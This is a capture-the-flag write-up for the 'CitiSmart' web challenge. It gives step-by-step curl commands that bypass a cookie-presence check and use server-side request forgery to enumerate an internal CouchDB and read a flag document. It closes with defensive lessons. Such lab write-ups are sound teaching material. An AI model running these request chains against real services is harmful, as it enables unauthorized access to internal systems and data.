---
ctf: HTBLabs
title: CitiSmart
category: web
difficulty: unknown
tags: [authentication-bypass, ssrf, couchdb, information-disclosure]
flag_format: HTB{...}
date: 2026-08-11
---

# CitiSmart

## Challenge
Citismart is an innovative Smart City monitoring platform aimed at detecting anomalies in public sector operations. We invite you to explore the application for any potential vulnerabilities and uncover the hidden flag within its depths. IP: 154.57.164.82:31384

## Approach

### 1. Application reconnaissance

The landing page linked to `/login`, but the application did not offer a
registration route. Inspecting the JavaScript loaded by the login page exposed
the following API endpoints:

```text
/api/auth/me
/api/auth/login
/api/auth/logout
/api/dashboard/endpoints
/api/dashboard/metrics
```

Requesting a dashboard endpoint without authentication returned:

```json
{"message":"cookie token is not found"}
```

### 2. Authentication bypass

The dashboard middleware only checked whether a `token` cookie existed; it did
not verify that the token was valid. Supplying any non-empty value bypassed the
authentication check:

```bash
curl -s \
  -H 'Cookie: token=a' \
  http://154.57.164.82:31384/api/dashboard/endpoints
```

This returned the configured city-monitoring endpoints and confirmed access to
the protected API.

### 3. Discovering SSRF

`POST /api/dashboard/endpoints` accepted a JSON object containing a URL and a
sector name. The backend contacted the supplied URL before saving it, allowing
arbitrary server-side HTTP requests:

```bash
curl -s \
  -H 'Cookie: token=a' \
  -H 'Content-Type: application/json' \
  -X POST \
  --data '{"url":"http://127.0.0.1:5984/","sector":"couchdb"}' \
  http://154.57.164.82:31384/api/dashboard/endpoints
```

The responses fetched by the monitoring service could then be read through:

```bash
curl -s \
  -H 'Cookie: token=a' \
  http://154.57.164.82:31384/api/dashboard/metrics
```

Testing internal services identified CouchDB on `127.0.0.1:5984`.

### 4. Enumerating CouchDB

The CouchDB database list was fetched through the SSRF primitive:

```bash
curl -s \
  -H 'Cookie: token=a' \
  -H 'Content-Type: application/json' \
  -X POST \
  --data '{"url":"http://127.0.0.1:5984/_all_dbs","sector":"db_enum"}' \
  http://154.57.164.82:31384/api/dashboard/endpoints
```

Reading `/api/dashboard/metrics` showed:

```json
{"db_enum":"[\"citismart\"]"}
```

The `citismart` database's changes feed revealed its document IDs:

```bash
curl -s \
  -H 'Cookie: token=a' \
  -H 'Content-Type: application/json' \
  -X POST \
  --data '{"url":"http://127.0.0.1:5984/citismart/_changes","sector":"changes"}' \
  http://154.57.164.82:31384/api/dashboard/endpoints
```

The response included these documents:

```text
monitoring_endpoints
user:citismart_admin
FLAG
```

The flag document can be requested through the same SSRF chain. A trailing
fragment marker (`#`) is important here: it prevents URL material appended by
the monitoring application from becoming part of the request sent to CouchDB.

```bash
curl -s \
  -H 'Cookie: token=a' \
  -H 'Content-Type: application/json' \
  -X POST \
  --data '{"url":"http://127.0.0.1:5984/citismart/FLAG#","sector":"flag"}' \
  http://154.57.164.82:31384/api/dashboard/endpoints

curl -s \
  -H 'Cookie: token=a' \
  http://154.57.164.82:31384/api/dashboard/metrics
```

The live CouchDB response was:

```json
{
  "_id": "FLAG",
  "_rev": "1-ee80946409fe94e517fdfd32b4d96d3c",
  "value": "FLAG=HTB{redacted}"
}
```

## Tools

- `curl` for HTTP requests and API interaction
- `rg` for extracting routes, interesting strings, and the flag
- Browser/JavaScript source inspection for discovering hidden API endpoints

## Lessons

- Authentication middleware must validate a token's signature, expiry, and
  claims; merely checking whether a cookie exists provides no authentication.
- Server-side URL fetching must use a strict allowlist and must block loopback,
  private, link-local, and metadata-service address ranges.
- SSRF filtering must also account for redirects, DNS rebinding, alternate IP
  representations, and URL parsing inconsistencies.
- Internal services should still enforce authentication and least privilege.
  Network placement alone is not an adequate security boundary.
- Frontend bundles frequently reveal useful API routes, even when those routes
  are not linked in the user interface.

## Flag

```text
HTB{redacted}
```
